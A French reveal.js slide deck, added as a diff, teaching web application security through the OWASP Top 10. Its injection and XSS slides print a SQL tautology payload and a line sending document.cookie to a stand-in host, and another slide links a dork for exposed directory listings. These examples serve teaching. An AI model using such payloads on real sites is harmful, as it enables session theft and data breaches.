@@ -1,0 +1,479 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>La sécurité des applications - OWASP</title>
+
+		<meta name="description" content="Du Web 1.0 à l'application mobile">
+		<meta name="author" content="Valentin Brosseau">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/default.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<style>
+			.reveal p{
+				margin-bottom: 40px;
+			}
+		</style>
+
+		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+		<script>
+			if( window.location.search.match( /print-pdf/gi ) ) {
+				var link = document.createElement( 'link' );
+				link.rel = 'stylesheet';
+				link.type = 'text/css';
+				link.href = 'css/print/pdf.css';
+				document.getElementsByTagName( 'head' )[0].appendChild( link );
+			}
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a default -->
+			<div class="slides">
+				<section>
+					<h1>Sécurité des applications WEB</h1>
+					<h2>Risques et menaces</h2>
+					<p>
+						<small>Par <a href="https://github.com/c4software">Valentin Brosseau</a> / <a href="http://twitter.com/c4software">@c4software</a></small>
+					</p>
+				</section>
+
+				<section>
+					<h2>En groupe</h2>
+					<h3>Pour vous, la sécurité c’est quoi ?</h3>
+				</section>
+
+				<section>
+					<h2>Des découvertes de failles tous les jours !</h2>
+					<h3>Des exemples en tête ?</h3>
+				</section>
+
+
+
+				<section>
+					<img src="./img/faille1.png">
+				</section>
+
+				<section>
+					<img src="./img/faille2.png">
+				</section>
+
+				<section>
+					<img src="./img/faille3.png">
+				</section>
+
+				<section>
+					<img src="./img/faille4.png">
+				</section>
+
+				<section>
+					<img src="./img/faille5.png">
+				</section>
+
+				<section>
+					<img src="./img/faille6.png">
+				</section>
+
+				<section>
+					<img src="./img/faille7.png">
+				</section>
+
+				<section>
+					<h3>Comment être se tenir à jour ?</h3>
+					<h4>Prévenir plutôt que guérir…</h4>
+				</section>
+
+				<section>
+					<h3>Des sites à surveiller</h3>
+					<h4>Vous êtes la première ligne d’informations</h4>
+					<ul>
+						<li><a href="https://www.us-cert.gov/">US CERT (LA SOURCE)</a></li>
+						<li><a href="http://thehackernews.com/">The Hacker News</a></li>
+						<li>Zataz</li>
+						<li><a href="https://www.reddit.com/r/netsec/">Reddit NetSec</a></li>
+						<li>Next INpact (~Payant)</li>
+						<li>Google Actu</li>
+					</ul>
+					<p class="fragment">Vous en avez d’autres en tête ?</p>
+				</section>
+
+				<section>
+					<h3>Les impacts liés à la sécurité</h3>
+					<h4>
+						La sécurité informatique dans une application c’est un « équilibre »
+					</h4>
+				</section>
+
+				<section>
+					<h3>Le prix de la sécurité</h3>
+					<ul>
+						<li>Impact fonctionnel</li>
+						<li>Limitation de l’experience utilisateur (UX)</li>
+						<li>Impact financier</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Les facteurs d’expositions</h3>
+					<img src="./img/expositions.png">
+				</section>
+
+				<section>
+					<h3>L’insécurité à également un coût</h3>
+					<p>À votre avis ?</p>
+					<div class="fragment">
+						<h1>2.86 Millions d’euros</h1>
+						<p>Estimation des coûts pour une entreprise à <u>chaque incident</u> de vol de données en France</p>
+						<small>source: Cost Of Data Breach - Symantec</small>
+					</div>
+				</section>
+
+				<section>
+					<h3>Et si je ne fais rien !?</h3>
+					<ul>
+						<li>Volontaire !</li>
+						<li>Involontaire ?</li>
+					</ul>
+				</section>
+
+				<section>
+					<img src="./img/random.png">
+				</section>
+
+				<section>
+					<h3>Intégrer la sécurité à toutes les étapes</h3>
+					<div class="fragment">
+						<p>La sécurité c’est un état d’esprit à intégrer.</p><p><u>C’est aussi votre métier</u></p>
+						<ul>
+							<li>Réseau ?</li>
+							<li>Développeur ?</li>
+							<li>À votre avis ? Qui doit travailler la sécurité ?</li>
+							<li class="fragment"><u>Les deux!</u></li>
+						</ul>
+					</div>
+				</section>
+
+				<section>
+					<img src="./img/toutes_les_etapes.png">
+				</section>
+
+				<section>
+					<h3>Améliorer la sécurité</h3>
+					<ul>
+						<li>Dès la conception</li>
+						<li>Comprendre et avoir en tête les règles</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Open Web Application Security Project (OWASP)</h3>
+					<h4>Les dix risques par ordre de dangerosité</h4>
+				</section>
+
+				<section>
+					<h3>Le Top10 Web</h3>
+				</section>
+
+				<section>
+					<h3>The Injection</h3>
+					<p>Correspond au risque d’injection SQL, shell...</p>
+				</section>
+
+				<section>
+					<h3>Broken Authentication and Session Management</h3>
+					<p>Correspond au risque de casser la gestion de l’authentification et de la session. Comprend notamment le vol de session ou la récupération de mots de passe.</p>
+				</section>
+
+				<section>
+					<h3>Cross-Site Scripting</h3>
+					<p>Correspond au XSS soit l’injection de contenu dans une page, ce qui provoque des actions non désirées sur une page Web. Les failles XSS sont particulièrement répandues parmi les failles de sécurités Web.</p>
+				</section>
+
+				<section>
+					<h3>Insecure Direct Object References</h3>
+					<p>Correspond aux failles de sécurités des ID de données visualisées. Nécessite de mettre en place un contrôle d’accès aux données.</p>
+				</section>
+
+				<section>
+					<h3>Security Misconfiguration</h3>
+					<p>Correspond aux failles de configuration liées aux serveurs Web, applications, base de données ou frameworks.</p>
+				</section>
+
+				<section>
+					<h3>Sensitive Data Exposure</h3>
+					<p>Correspond aux failles de sécurités liées aux données sensibles comme les mots de passe, les numéros de carte de paiement ou encore les données personnelles et la nécessité de chiffrer ces données.</p>
+				</section>
+
+				<section>
+					<h3>Missing Function Level Access Control</h3>
+					<p>Failles de sécurités liées aux accès de fonctionnalité.</p>
+				</section>
+
+				<section>
+					<h3>Cross-Site Request Forgery (CSRF)</h3>
+					<p>Failles liées à l’exécution de requêtes à l’insu de l’utilisateur.</p>
+				</section>
+
+				<section>
+					<h3>Using Components with Known Vulnerabilities</h3>
+					<p>Failles liées à l’utilisation de composants tiers.</p>
+				</section>
+
+				<section>
+					<h3>Unvalidated Redirects and Forwards</h3>
+					<p>Failles liées aux redirects et forwards génériques des applications.</p>
+				</section>
+
+				<section>
+					<h3>Les outils autour d’OWASP</h3>
+					<ul>
+						<li>WebGoat (Formation)</li>
+						<li>WebScarab (Audit)</li>
+						<li>OWASP Testing Guide (Guide pour voir le niveau de sécu)</li>
+						<li>OWASP Code Review Guide (Méthode d’audit)</li>
+					</ul>
+				</section>
+
+				<section>
+					<h4>Avec OWASP on parle de</h4>
+					<h3>Vulnérabilité, et non de risque</h3>
+				</section>
+
+				<section>
+					<h3>On connait les failles</h3>
+					<h4>Comment on les corrige ?</h4>
+				</section>
+
+				<section>
+					<img src="./img/securite.png">
+				</section>
+
+				<section>
+					<ul>
+						<li>IDS (Intrusion Detection Systeme)</li>
+						<li>IPS (Intrusion Prevension Systeme)</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>IPS</h3>
+					<ul>
+						<li>Ils bloquent tout ce qui parait infectieux à leurs yeux, mais n'étant pas fiable à 100 % ils peuvent donc bloquer malencontreusement des applications ou des trafics légitimes.</li>
+						<li>Ils laissent parfois passer certaines attaques sans les repérer.</li>
+						<li>Peu discrets et peuvent être découverts lors de l'attaque d'un pirate qui une fois qu'il aura découvert l'IPS s'empressera de trouver une faille dans ce dernier pour le détourner et arriver à son but.</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>IDS</h3>
+					<p>Un système de détection d'intrusion (Intrusion Detection System) est un mécanisme destiné à repérer des activités anormales ou suspectes sur la cible analysée</p>
+					<img src="./img/nids.png">
+				</section>
+
+				<section>
+					<h3>Mais, une faille c’est quoi ?</h3>
+					<img src="./img/faille.png">
+				</section>
+
+				<section>
+					<h3>Les type de failles</h3>
+					<ul>
+						<li>L’humain (Social Engineering)</li>
+						<li>Applicatif (Hack)</li>
+						<li>L’argent (Jusqu’à quel montant une personne donne l’information ?)</li>
+					</ul>
+				</section>
+
+				<section>
+					<h4>Comprendre le TOP 10</h4>
+				</section>
+
+				<section>
+					<h3>Pour éviter d’être vulnérable</h3>
+				</section>
+
+				<section>
+					<h3>L’injection</h3>
+					<pre><code>SELECT * FROM client WHERE id='" . $_GET["id"] . "'</code></pre>
+					<pre class="fragment"><code>http://exemple.com/liste?id='or '1'='1</code></pre>
+				</section>
+
+				<section>
+					<h3>Violation de gestion d'authentification et de session</h3>
+					<pre><code>http://exemple.com/?jsessionid=A2938298D293</code></pre>
+				</section>
+
+				<section>
+					<h3>XSS</h3>
+					<p>Éxecution de code Javascript sans validation</p>
+					<pre><code>Votre Nom : <input type="text" name="nom" value="" /></code></pre>
+					<pre class="fragment"><code>alert("'echo $_POST["nom"];'");</code></pre>
+					<pre class="fragment"><code>window.location = 'https://www.exemple.com? cookie=' + document.cookie;</code></pre>
+				</section>
+
+				<section>
+					<h3>Référence directe non sécurisée à un objet</h3>
+					<pre><code>http://exemple.com/liste?mode=client</code></pre>
+					<div class="fragment">
+						<p>Si je change client par … admin ?</p>
+						<pre><code>SELECT * FROM client where mode=?</code></pre>
+						<pre><code>$stmt->bindParam(1, $mode);</code></pre>
+					</div>
+				</section>
+
+				<section>
+					<h3>Mauvaise configuration sécurisée</h3>
+					<ul>
+						<li>Console d’administration disponible sans authentification en ligne</li>
+						<li>Listage des repertoires (<a href="https://www.google.fr/search?dcr=0&q=-inurl%3A%28htm%7Chtml%7Cphp%29+intitle%3A"index+of"+%2B"last+modified"+%2B"parent+directory"+%2Bdescription+%2Bsize&oq=-inurl%3A%28htm%7Chtml%7Cphp%29+intitle%3A"index+of"+%2B"last+modified"+%2B"parent+directory"+%2Bdescription+%2Bsize">Exemple</a>)</li>
+						<li>Exemples de code non supprimés</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Exposition de données sensibles</h3>
+					<ul>
+						<li>Espace client sans SSL</li>
+						<li>Mot de passe en claire (ou en MD5) dans la base de données</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Manque de contrôle d'accès au niveau fonctionnel</h3>
+					<ul>
+						<li>Page d’admin accessible avec un compte utilisateur</li>
+						<li>Mode non filtré (similaire à l’exemple mode={client,admin})</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>CSRF: Falsification des requêtes</h3>
+					<ul>
+						<li>Rejeu de requête déjà joué</li>
+					</ul>
+					<br><br>
+					<h4>Comment le bloquer ?</h4>
+					<p>Ajouter un identifiant/jeton dans la requête, unique et non réutilisable</p>
+				</section>
+
+				<section>
+					<h3>Utilisation de composants avec des vulnérabilités connues</h3>
+					<ul>
+						<li>CMS non à jour</li>
+						<li>Apache / Tomcat non patchés</li>
+						<li>Librairies XYZ non à jour</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Redirections et renvois non validés</h3>
+					<ul>
+						<li>Utilisation de votre site comme « masque » dans du phishing</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Comment réduire le risque ?</h3>
+					<ul class="fragment">
+						<li>Sensibilisations - Formations</li>
+						<li>Revue de code</li>
+						<li>Tests d’intrusions</li>
+						<li>Sécurité lors du recrutement</li>
+						<li>Sécurité dès la conception du projet</li>
+						<li>Suivi des bonnes pratiques (ex: OWASP)</li>
+					</ul>
+				</section>
+
+
+				<section>
+					<h3>Pourquoi il faut se battre (en interne) ?</h3>
+					<ul class="fragement">
+						<li>Résistance au changement</li>
+						<li>ERP / CMS</li>
+						<li>La sécurité est vue comme un frein, pas une fonctionnalitée</li>
+						<li>Déni de la réalité</li>
+						<li>Multitude de librairies</li>
+						<li>Developpement externe (presta, stagiaires, …)</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Se former</h3>
+					<h4>En continu</h4>
+					<ul>
+						<li>Nuit du Hack / Hack In Paris</li>
+						<li>Internet</li>
+						<li>Appliquer les bonnes pratiques tout le temps !</li>
+					</ul>
+				</section>
+
+				<section>
+					<img src="./img/nuitduhack.png">
+				</section>
+
+				<section>
+					<h3>Des questions ?</h3>
+				</section>
+
+			</div>
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: false,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+				keyboard: {
+					40: 'prev',
+					38: 'next',
+					9: function() {Reveal.toggleOverview()}
+				},
+
+				// Parallax scrolling
+				//parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+				//parallaxBackgroundSize: '2100px 900px',
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } },
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
